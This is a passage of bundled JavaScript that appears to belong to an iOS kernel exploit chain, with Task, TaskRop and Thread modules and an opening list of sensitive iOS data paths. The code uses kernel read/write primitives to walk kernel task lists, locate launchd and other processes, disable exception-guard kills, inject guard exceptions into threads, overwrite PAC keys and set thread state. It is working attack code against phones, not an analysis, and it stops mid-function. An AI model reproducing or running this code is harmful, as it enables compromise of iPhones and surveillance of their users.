"/var/containers/Bundle/Application/", 0), "/private/var/containers/Shared/SystemGroup/", 0), "/private/var/mobile/Containers/Data/Application/", 0), "/var/mobile/Containers/Data/Application/", 0), "/private/var/mobile/Containers/Shared/AppGroup/", 0), "/private/var/mobile/Library/UserNotificationsUI/NotificationListPersistentState.json", 0), "/private/var/mobile/Library/UserNotifications/", 0), "/private/var/mobile/Library/Logs/CrashReporter/", 0), "/private/var/mobile/Library/ExternalAccessory", 0), "/private/var/mobile/Library/Shortcuts/", 0), _defineProperty(_defineProperty(_ref, "/private/var/tmp/", 0), "/tmp/", 0))
};


/***/ }),

/***/ "./libs/TaskRop/SelfTaskStruct.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return SelfTaskStruct; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var _buffer = /*#__PURE__*/new WeakMap();
var _dataView = /*#__PURE__*/new WeakMap();
var SelfTaskStruct = /*#__PURE__*/function () {
  function SelfTaskStruct() {
    _classCallCheck(this, SelfTaskStruct);
    _classPrivateFieldInitSpec(this, _buffer, void 0);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_buffer, this, new ArrayBuffer(32));
    _classPrivateFieldSet(_dataView, this, new DataView(_classPrivateFieldGet(_buffer, this)));
    this.addr = 0x0n;
    this.spaceTable = 0x0n;
    this.portObject = 0x0n;
    this.launchdTask = 0x0n;
  }
  return _createClass(SelfTaskStruct, [{
    key: "addr",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(0, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(0, value, true);
    }
  }, {
    key: "spaceTable",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(8, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(8, value, true);
    }
  }, {
    key: "portObject",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(16, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(16, value, true);
    }
  }, {
    key: "launchdTask",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(24, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(24, value, true);
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/Task.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return Task; });
/* harmony import */ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/TaskRop/SelfTaskStruct.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__("./libs/Chain/Native.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
var _Task;
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }




var TAG = "TASK";
var TASK_EXC_GUARD_MP_CORPSE = 0x40;
var TASK_EXC_GUARD_MP_FATAL = 0x80;
var TASK_EXC_GUARD_MP_DELIVER = 0x10;
var Task = /*#__PURE__*/function () {
  function Task() {
    _classCallCheck(this, Task);
  }
  return _createClass(Task, null, [{
    key: "init",
    value: function init(selfTaskAddr) {
      // Update KALLOC_ARRAY_TYPE_SHIFT
      this.KALLOC_ARRAY_TYPE_SHIFT = BigInt(64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().T1SZ_BOOT - 1n);

      /*
       * This function should be invoked as the initializer of the this Task utility.
       * It setups the global var "gSelfTask" containing values used all across the task functions to lookup ports.
       * It also retrieves the "launchd" task address.
       */
      this.gSelfTask.addr = selfTaskAddr;
      var spaceTable = _assertClassBrand(Task, this, _getSpaceTable).call(this, this.gSelfTask.addr);
      this.gSelfTask.portObject = _assertClassBrand(Task, this, _getPortObject).call(this, spaceTable, 0x203n);
      this.gSelfTask.launchdTask = _assertClassBrand(Task, this, _searchForLaunchdTask).call(this);
      console.log(TAG, "Self task address: ".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.addr)));
      console.log(TAG, "Self task space table: ".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(spaceTable)));
      console.log(TAG, "Self task port object: ".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.portObject)));
      console.log(TAG, "launchd task: ".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.launchdTask)));
    }
  }, {
    key: "trunc_page",
    value: function trunc_page(addr) {
      return addr & ~(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_SIZE - 1n);
    }
  }, {
    key: "round_page",
    value: function round_page(addr) {
      return this.trunc_page(addr + (libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_SIZE - 1n));
    }
  }, {
    key: "pidof",
    value: function pidof(name) {
      var currTask = this.gSelfTask.launchdTask;
      while (true) {
        var procAddr = this.getTaskProc(currTask);
        var command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
        libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
        var resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command, 18);
        if (name === resultName) {
          var pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
          return pid;
        }
        var nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
        if (!nextTask || nextTask == currTask) break;
        currTask = nextTask;
      }
      return 0;
    }
  }, {
    key: "getTaskAddrByPID",
    value: function getTaskAddrByPID(pid) {
      var currTask = this.gSelfTask.launchdTask;
      while (true) {
        var procAddr = this.getTaskProc(currTask);
        var currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
        if (currPid == pid) return currTask;
        var nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
        if (!nextTask || nextTask == currTask) break;
        currTask = nextTask;
      }
      return 0;
    }
  }, {
    key: "disableExcGuardKill",
    value: function disableExcGuardKill(taskAddr) {
      // in mach_port_guard_ast, the victim would crash if these are on.
      var excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard);
      //console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);
      excGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);
      excGuard |= TASK_EXC_GUARD_MP_DELIVER;
      //console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);
      libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard, excGuard);
    }
  }, {
    key: "getTaskAddrByName",
    value: function getTaskAddrByName(name) {
      var currTask = this.gSelfTask.launchdTask;
      while (true) {
        var procAddr = this.getTaskProc(currTask);
        var command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
        libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
        var resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command, 18);
        //console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);
        if (name === resultName) {
          //console.log(TAG, `Found target process: ${name}`);
          return currTask;
        }
        var nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
        if (!nextTask || nextTask == currTask) break;
        currTask = nextTask;
      }
      return false;
    }
  }, {
    key: "getRightAddr",
    value: function getRightAddr(port) {
      var spaceTable = _assertClassBrand(Task, this, _getSpaceTable).call(this, this.gSelfTask.addr);
      return _assertClassBrand(Task, this, _getPortEntry).call(this, spaceTable, port);
    }
  }, {
    key: "getTaskProc",
    value: function getTaskProc(taskAddr) {
      var procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().procRO);
      var procAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(procROAddr);
      return procAddr;
    }
  }, {
    key: "getPortAddr",
    value: function getPortAddr(port) {
      if (!port) return 0;
      var spaceTable = _assertClassBrand(Task, this, _getSpaceTable).call(this, this.gSelfTask.addr);
      return _assertClassBrand(Task, this, _getPortObject).call(this, spaceTable, port);
    }
  }, {
    key: "getPortKObject",
    value: function getPortKObject(port) {
      var portObject = this.getPortAddr(port);
      return _assertClassBrand(Task, this, _getPortKObjectByAddr).call(this, portObject);
    }
  }, {
    key: "firstThread",
    value: function firstThread(taskAddr) {
      var first = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().threads);
      return first;
    }
  }, {
    key: "getMap",
    value: function getMap(taskAddr) {
      var vmMap = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().mapTask);
      return vmMap;
    }
  }, {
    key: "getPortKObjectOfTask",
    value: function getPortKObjectOfTask(taskAddr, port) {
      var portObject = this.getPortAddrOfTask(taskAddr, port);
      return _assertClassBrand(Task, this, _getPortKObjectByAddr).call(this, portObject);
    }
  }, {
    key: "getPortAddrOfTask",
    value: function getPortAddrOfTask(taskAddr, port) {
      var spaceTable = _assertClassBrand(Task, this, _getSpaceTable).call(this, taskAddr);
      return _assertClassBrand(Task, this, _getPortObject).call(this, spaceTable, port);
    }
  }]);
}();
_Task = Task;
function _getSpaceTable(taskAddr) {
  var space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().ipcSpace);
  var spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().spaceTable);
  //console.log(TAG,`space: ${Utils.hex(space)}`);
  //console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
  spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(spaceTable);
  //console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
  return _assertClassBrand(_Task, this, _kallocArrayDecodeAddr).call(this, BigInt(spaceTable));
}
function _mach_port_index(port) {
  return port >> 8n;
}
function _getPortEntry(spaceTable, port) {
  var portIndex = _assertClassBrand(_Task, this, _mach_port_index).call(this, port);
  return spaceTable + portIndex * 0x18n;
}
function _getPortObject(spaceTable, port) {
  //console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);
  var portEntry = _assertClassBrand(_Task, this, _getPortEntry).call(this, spaceTable, port);
  //console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);
  var portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().entryObject);
  //console.log(TAG,`portObject:${Utils.hex(portObject)}`);
  return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(portObject);
}
function _searchForLaunchdTask() {
  /*
   * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.
   */

  var currTask = this.gSelfTask.addr;
  while (true) {
    var procAddr = this.getTaskProc(currTask);
    var currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
    if (currPid == 1) return currTask;
    var prevTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().prevTask);
    if (!prevTask || prevTask === currTask) break;
    currTask = prevTask;
  }
  return 0n;
}
function _kallocArrayDecodeAddr(ptr) {
  var zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);
  if (ptr & zone_mask) {
    ptr &= ~0x1fn;
  } else {
    ptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_MASK;
    //console.log(TAG,`ptr:${Utils.hex(ptr)}`);
    ptr |= zone_mask;
    //console.log(TAG,`ptr2:${Utils.hex(ptr)}`);
  }
  return ptr;
}
function _getPortKObjectByAddr(portObject) {
  if (!portObject) return 0;
  var kobject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portObject + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().objectKObject);
  return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(kobject);
}
_defineProperty(Task, "gSelfTask", void 0);
_defineProperty(Task, "KALLOC_ARRAY_TYPE_SHIFT", void 0);
_Task.gSelfTask = new _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();


/***/ }),

/***/ "./libs/TaskRop/TaskRop.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return TaskRop; });
/* harmony import */ var _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/Chain/Chain.js");
/* harmony import */ var _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/TaskRop/Task.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }



var TAG = "TASKROP";
var TaskRop = /*#__PURE__*/function () {
  function TaskRop() {
    _classCallCheck(this, TaskRop);
  }
  return _createClass(TaskRop, null, [{
    key: "init",
    value: function init() {
      var selfTaskAddr = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].getSelfTaskAddr();
      if (!selfTaskAddr) {
        console.log(TAG, "Unable to find self task address");
        return;
      }
      console.log(TAG, "selfTaskAddr:".concat(_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(selfTaskAddr)));
      _Task__WEBPACK_IMPORTED_MODULE_2__["default"].init(selfTaskAddr);
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/Thread.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return Thread; });
/* harmony import */ var _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/Chain/Chain.js");
/* harmony import */ var _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var _Chain_Native__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/Chain/Native.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__("./libs/TaskRop/ThreadState.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }




var AST_GUARD = 0x1000;
var TAG = "THREAD";
var Thread = /*#__PURE__*/function () {
  function Thread() {
    _classCallCheck(this, Thread);
  }
  return _createClass(Thread, null, [{
    key: "getTro",
    value: function getTro(thread) {
      var tro = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().tro);
      // Ignore threads with invalid tro address.
      if (!(tro & 0xf000000000000000n)) {
        //console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);
        return 0n;
      }
      return tro;
    }
  }, {
    key: "getCtid",
    value: function getCtid(thread) {
      var ctid = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ctid);
      return ctid;
    }
  }, {
    key: "getTask",
    value: function getTask(thread) {
      var tro = this.getTro(thread);
      // Ignore threads with invalid tro address.
      if (!(tro & 0xf000000000000000n) || tro === 0n) return 0n;
      var task = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(tro + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().troTask);
      return task;
    }
  }, {
    key: "next",
    value: function next(thread) {
      if (_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].strip(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads) < 0xffffffd000000000n) return 0;
      var next = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads);
      if (next < 0xffffffd000000000n) return 0;
      return next;
    }
  }, {
    key: "setMutex",
    value: function setMutex(thread, ctid) {
      _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData, ctid);
    }
  }, {
    key: "getMutex",
    value: function getMutex(thread) {
      var mutex = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData);
      return mutex;
    }
  }, {
    key: "getStack",
    value: function getStack(thread) {
      var stackptr = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().kstackptr);
      return stackptr;
    }
  }, {
    key: "injectGuardException",
    value: function injectGuardException(thread, code) {
      if (!this.getTro(thread)) {
        console.log(TAG, "got invalid tro of thread, not injecting exception since thread is dead");
        return false;
      }

      // 18.4+
      if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
        _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0x17n);
        _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, code);
      } else {
        _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, code);
      }
      var ast = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
      ast |= AST_GUARD;
      _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);
      return true;
    }
  }, {
    key: "clearGuardException",
    value: function clearGuardException(thread) {
      if (!this.getTro(thread)) {
        console.log(TAG, "got invalid tro of thread, still clearing exception to avoid crash");
      }
      var ast = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
      ast &= ~AST_GUARD | 0x80000000;
      _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);

      // 18.4+
      if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
        if (_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode) == 0x17n) {
          _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
          _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, 0n);
        }
      } else {
        _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
      }
    }
  }, {
    key: "getOptions",
    value: function getOptions(thread) {
      var options = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read16(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options);
      return options;
    }
  }, {
    key: "setOptions",
    value: function setOptions(thread, options) {
      _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write16(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options, options);
    }
  }, {
    key: "getRopPid",
    value: function getRopPid(thread) {
      var ropPid = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid);
      return ropPid;
    }
  }, {
    key: "getJopPid",
    value: function getJopPid(thread) {
      var jopPid = _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid);
      return jopPid;
    }
  }, {
    key: "setPACKeys",
    value: function setPACKeys(thread, keyA, keyB) {
      _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid, keyA);
      _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + _Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid, keyB);
    }
  }, {
    key: "getState",
    value: function getState(machThread) {
      var statePtr = _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].mem;
      var stateCountPtr = _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].mem + 0x200n;
      _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].write32(stateCountPtr, _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
      var kr = _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].callSymbol("thread_get_state", machThread, _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64, statePtr, stateCountPtr);
      if (kr != 0) {
        console.log(TAG, "Unable to read thread state");
        return false;
      }
      var stateBuff = _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].read(statePtr, _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_SIZE);
      var state = new _ThreadState__WEBPACK_IMPORTED_MODULE_3__["default"](stateBuff);
      return state;
    }
  }, {
    key: "setState",
    value: function setState(machThread, threadAddr, state) {
      var options = 0;
      if (threadAddr) {
        options = Thread.getOptions(threadAddr);
        options |= 0x8000;
        Thread.setOptions(threadAddr, options);
      }
      var statePtr = _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].mem;
      _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].write(statePtr, state.buffer);
